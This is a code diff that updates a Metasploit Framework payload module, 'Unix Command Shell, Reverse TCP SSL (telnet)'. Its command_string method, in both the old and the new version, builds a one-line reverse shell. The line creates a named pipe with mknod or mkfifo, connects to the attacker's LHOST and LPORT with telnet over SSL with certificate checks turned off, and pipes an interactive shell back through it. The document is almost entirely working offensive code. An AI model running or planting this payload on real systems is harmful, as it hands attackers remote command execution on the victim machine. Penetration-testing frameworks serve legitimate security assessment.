@@ -1,58 +1,54 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/handler/reverse_tcp_ssl'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
 
-	include Msf::Payload::Single
-	include Msf::Sessions::CommandShellOptions
+  CachedSize = :dynamic
 
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'          => 'Unix Command Shell, Reverse TCP SSL (telnet)',
-			'Description'   => %q{
-				Creates an interactive shell via mknod and telnet.
-				This method works on Debian and other systems compiled
-				without /dev/tcp support. This module uses the '-z'
-				option included on some systems to encrypt using SSL.
-				},
-			'Author'        => 'RageLtMan',
-			'License'       => MSF_LICENSE,
-			'Platform'      => 'unix',
-			'Arch'          => ARCH_CMD,
-			'Handler'       => Msf::Handler::ReverseTcpSsl,
-			'Session'       => Msf::Sessions::CommandShell,
-			'PayloadType'   => 'cmd_bash',
-			'RequiredCmd'   => 'bash-tcp',
-			'Payload'       =>
-				{
-					'Offsets' => { },
-					'Payload' => ''
-				}
-			))
-	end
+  include Msf::Payload::Single
+  include Msf::Sessions::CommandShellOptions
 
-	#
-	# Constructs the payload
-	#
-	def generate
-		vprint_good(command_string)
-		return super + command_string
-	end
+  def initialize(info = {})
+    super(merge_info(info,
+      'Name'          => 'Unix Command Shell, Reverse TCP SSL (telnet)',
+      'Description'   => %q{
+        Creates an interactive shell via mkfifo and telnet.
+        This method works on Debian and other systems compiled
+        without /dev/tcp support. This module uses the '-z'
+        option included on some systems to encrypt using SSL.
+        },
+      'Author'        => 'RageLtMan <rageltman[at]sempervictus>',
+      'License'       => MSF_LICENSE,
+      'Platform'      => 'unix',
+      'Arch'          => ARCH_CMD,
+      'Handler'       => Msf::Handler::ReverseTcpSsl,
+      'Session'       => Msf::Sessions::CommandShell,
+      'PayloadType'   => 'cmd',
+      'RequiredCmd'   => 'telnet',
+      'Payload'       =>
+        {
+          'Offsets' => { },
+          'Payload' => ''
+        }
+      ))
+  end
 
-	#
-	# Returns the command string to use for execution
-	#
-	def command_string
-		pipe_name = Rex::Text.rand_text_alpha( rand(4) + 8 )
-		cmd = "mknod #{pipe_name} p && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
-	end
+  #
+  # Constructs the payload
+  #
+  def generate
+    vprint_good(command_string)
+    super + command_string
+  end
+
+  #
+  # Returns the command string to use for execution
+  #
+  def command_string
+    pipe_name = Rex::Text.rand_text_alpha( rand(4) + 8 )
+    "mkfifo #{pipe_name} && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
+  end
 end
